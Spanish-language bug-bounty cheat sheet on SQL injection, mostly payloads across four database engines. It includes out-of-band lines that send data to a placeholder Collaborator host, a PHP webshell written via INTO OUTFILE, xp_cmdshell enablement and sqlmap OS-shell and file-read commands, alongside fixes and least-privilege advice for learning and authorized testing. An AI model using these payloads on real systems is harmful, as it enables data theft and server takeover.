---
title: "SQL Injection"
description: "Inyección de SQL arbitrario cuando la app concatena input no confiable dentro de una query."
category: "Web"
date: 2026-07-18
---
# 💉 SQL Injection

Inyección de SQL arbitrario cuando la app concatena input no confiable dentro de una query. Sigue siendo Critical: lectura/escritura de la BD, auth bypass y, a menudo, RCE.

## El concepto núcleo

```
# La app construye:  SELECT * FROM users WHERE id = '<INPUT>'
id=1'          → error de sintaxis  (señal)
id=1 AND 1=1   → 200 normal
id=1 AND 1=2   → distinto/ vacío    (booleano confirmado)
```

## Tipos

| Tipo | Cómo se confirma | Uso |
|------|------------------|-----|
| **In-band (error/union)** | Mensaje de error o `UNION SELECT` refleja datos | Extracción directa |
| **Blind booleano** | `AND 1=1` vs `AND 1=2` cambian la respuesta | Sin output visible |
| **Blind por tiempo** | `SLEEP(5)` / `pg_sleep(5)` retrasa la respuesta | Sin diferencia visible |
| **Out-of-band (OOB)** | DNS/HTTP a tu Collaborator (`xp_dirtree`, `LOAD_FILE`) | Firewall de salida bloquea directo |
| **Second-order** | Payload almacenado que se ejecuta en otra query | Ver **SSRF** second-order |

## Dónde buscar

- Query params, POST body, **headers** (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies.
- Campos de búsqueda, filtros, `ORDER BY` (sort), `LIMIT`, JSON anidado.
- Endpoints de API antiguos (`/api/v1`), export/report, importadores.

## Payloads de detección (mínimos, seguros)

```sql
-- Señal
'   "   `   \   )
1 AND 1=1        -- vs
1 AND 1=2

-- Booleano en string
' OR '1'='1' --
' OR '1'='2' --

-- Tiempo (confirmación sin output)
1'; SELECT pg_sleep(5)--          -- PostgreSQL
1' AND SLEEP(5)--                 -- MySQL
1'; WAITFOR DELAY '0:0:5'--       -- MSSQL

-- Prueba de identidad (no dumpear datos reales)
' UNION SELECT version(),current_user--
```

## UNION-based: explotación paso a paso

### 1. Encontrar el número de columnas

```sql
-- ORDER BY (incrementar hasta error)
' ORDER BY 1-- → OK ... ' ORDER BY 4-- → error → 3 columnas

-- UNION NULL (incrementar hasta que funcione)
' UNION SELECT NULL,NULL,NULL--  → OK → 3 columnas
```

### 2. Identificar columnas visibles

```sql
' UNION SELECT 'aaa','bbb','ccc'--
-- Buscar en la response cuál aparece renderizado
```

### 3. Extraer datos por DBMS

```sql
-- MySQL
' UNION SELECT database(),user(),version()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,NULL FROM users--

-- PostgreSQL
' UNION SELECT current_database(),current_user,version()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--

-- MSSQL
' UNION SELECT db_name(),system_user,@@version--
' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCHEMA'--
```

## Error-based: extracción vía mensajes de error

Cuando los errores de BD se muestran en la respuesta:

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
```

## Blind booleano: extracción carácter a carácter

Sin output visible ni errores, se extrae dato a dato:

```sql
-- Fuerza bruta por carácter
' AND SUBSTRING(user(),1,1)='r'--    → respuesta normal (true)
' AND SUBSTRING(user(),1,1)='s'--    → respuesta diferente (false)

-- Búsqueda binaria por ASCII (reduce ~95 requests a ~7 por carácter)
' AND ASCII(SUBSTRING(user(),1,1))>109--   → true/false
' AND ASCII(SUBSTRING(user(),1,1))>96--    → refinar rango
-- ... reducir hasta obtener el valor exacto
```

## Blind por tiempo

Cuando ni siquiera cambia la respuesta HTTP:

```sql
-- MySQL
' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(3),0)--
-- PostgreSQL
'; SELECT CASE WHEN SUBSTRING(current_user,1,1)='p'
  THEN pg_sleep(3) ELSE pg_sleep(0) END--
-- MSSQL
'; IF SUBSTRING(system_user,1,1)='s' WAITFOR DELAY '0:0:3'--
```

## Out-of-band (OOB)

Útil cuando no hay respuesta directa ni timing fiable:

```sql
-- MSSQL: xp_dirtree (genera DNS/SMB request)
'; EXEC master..xp_dirtree '\\COLLABORATOR\a'--
-- Con dato embebido:
'; EXEC master..xp_dirtree '\\'+db_name()+'.COLLABORATOR\a'--

-- MySQL: LOAD_FILE a UNC (Windows)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.COLLABORATOR\\a'))--

-- Oracle: UTL_HTTP
' AND 1=UTL_HTTP.REQUEST('http://COLLABORATOR/'||(SELECT user FROM dual))--

-- PostgreSQL: dblink (requiere extensión)
'; SELECT dblink_send_query('host=COLLABORATOR dbname=x','SELECT version()')--
```

> Reemplazar `COLLABORATOR` por tu servidor Burp Collaborator o interactsh.

## Second-order SQLi

El payload se almacena seguro (parametrizado) pero se usa sin sanitizar en una query posterior.

```
Ejemplo:
1. Registro: usuario crea cuenta con nombre: admin'--
2. La app guarda "admin'--" con prepared statement (seguro).
3. Cambio de contraseña: la app lee el username de BD y concatena:
   UPDATE users SET password='nueva' WHERE user='admin'--'
   → Cambia la contraseña de admin.
```

Difícil de detectar black-box; requiere auditoría de código o fuzzing en flujos multi-paso.

## Bypass de WAF / filtros

```sql
-- Case / comentarios: SeLeCt / /*!50000SELECT*/ / SEL/**/ECT
-- Espacios alternativos: %09 %0a %0c %0d /**/  ()
-- Sin comillas: 0x61646d696e (hex)  CHAR(97,100,109,105,110)
-- Encoding: %27  %2527 (doble URL)  Unicode
-- OR/AND filtrados: || && ; operadores lógicos alternativos
-- Notación científica: 0e1UNION SELECT 1,2,3  /  1.e(0)UNION SELECT 1,2,3
-- JSON-based (MySQL 5.7+): json_extract() bypass de parsers de WAF
-- HPP: ?id=1&id=' UNION SELECT 1,2,3-- (WAF ve cada param; backend concatena)
-- Inline version comments (MySQL): /*!50000UNION*/ /*!50000SELECT*/ 1,2,3
```

## Auth bypass clásico

```sql
usuario: admin'--
password: cualquiera
-- SELECT * FROM users WHERE user='admin'--' AND pass='...'
```

## SQLi a RCE por DBMS

| DBMS | Técnica | Requisito |
|------|---------|-----------|
| **MySQL** | `INTO OUTFILE '/var/www/html/shell.php'` (webshell) | FILE privilege + path escribible |
| **MSSQL** | `EXEC xp_cmdshell 'whoami'` | sysadmin role |
| **PostgreSQL** | `COPY (SELECT '') TO PROGRAM 'id'` | Superuser (9.3+) |
| **Oracle** | `dbms_scheduler.create_job(...)` | DBA role + CREATE JOB |

```sql
-- MSSQL: habilitar y usar xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';
-- MySQL: webshell vía INTO OUTFILE
' UNION SELECT '<?php system($_GET["cmd"]);?>',NULL INTO OUTFILE '/var/www/html/cmd.php'--
```

## Herramientas

| Herramienta | Uso |
|-------------|-----|
| **sqlmap** | `sqlmap -r req.txt --batch --level 3 --risk 2` — usado en **CCTV** |
| **Burp Scanner / Intruder** | Fuzzing de payloads + análisis de tiempos |
| **ghauri** | Alternativa moderna a sqlmap |
| **Revisión de código** | Queries concatenadas (auditoría **BlueCMS**) |

### sqlmap: uso avanzado

```bash
# OS shell (stacked queries + FILE/xp_cmdshell)
sqlmap -r req.txt --os-shell

# SQL shell interactiva
sqlmap -r req.txt --sql-shell

# Leer/escribir ficheros del servidor
sqlmap -r req.txt --file-read="/etc/passwd"
sqlmap -r req.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Tamper scripts (bypass WAF)
sqlmap -r req.txt --tamper=space2comment,between,randomcase
# Otros tampers: charencode, equaltolike, space2hash, percentage

# Second-order SQLi (verificar resultado en otra URL)
sqlmap -r req.txt --second-url="https://target.com/profile"

# Nivel maximo + proxy a Burp
sqlmap -r req.txt --level 5 --risk 3 --proxy="http://127.0.0.1:8080"
```

> [!warning] Verificación segura (Gate 3 del **Hunting Ejecutable**)
> Confirma con booleano/tiempo o `version()`/`current_user()`. **No** dumpees datos reales de usuarios; extrae solo pruebas de identidad de la BD. Nunca `DROP`/`UPDATE`/`DELETE`.

## Auditoría de código (el fix)

```
# Vulnerable
query = "SELECT * FROM users WHERE id = '" + req.id + "'"

# Correcto — consultas parametrizadas / prepared statements
cursor.execute("SELECT * FROM users WHERE id = %s", (req.id,))
```

## Defensa en profundidad

- **ORMs**: parametrizan queries normales, pero SQL raw sigue siendo vulnerable (`User.objects.raw("...%s" % id)` en Django, `db.execute(text("..."+id))` en SQLAlchemy). Auditar todo `.raw()`, `.execute(text())`, `.extra()`.
- **Stored procedures**: no son seguros si concatenan internamente (`EXEC('...'+@param)`). Solo son fix si usan parámetros nativos.
- **Minimo privilegio**: usuario de BD de la app nunca `root`/`sa`/`dba`. Revocar `FILE`, `xp_cmdshell`, `COPY TO PROGRAM`, `CREATE JOB`. Solo `SELECT` (e `INSERT`/`UPDATE` donde sea estrictamente necesario).

> El WAF es mitigacion temporal, no fix. Remediacion real = parametrizacion + minimo privilegio.

## Chaining

```
SQLi → volcado de hashes → cracking → ATO
SQLi (stacked/xp_cmdshell/FILE) → RCE
SQLi second-order → almacenado que dispara en query admin
SQLi UNION → leer ficheros del servidor (LFI-like)
SQLi → escribir webshell → RCE → pivoting
SQLi + SSRF → acceso a servicios internos vía DBMS (dblink, UTL_HTTP)
```

## Ejemplos en tus writeups
- **Blue Team y Malware (CAFUC)** — SQLi manual + BlueCMS (auditoría de código)
- Máquinas CCTV, Cobblestone → **Maquinas Boot2Root**

## Relacionado
- **Metodologia Bug Bounty** · **Hunting Ejecutable**
- **NoSQL Injection** — variante NoSQL de inyección
- **SSRF** — second-order SQLi vía SSRF
- **XSS y bypass CSP** — SQLi a XSS (second-order)
- **Claude-BugHunter** (skill `hunt-sqli`)
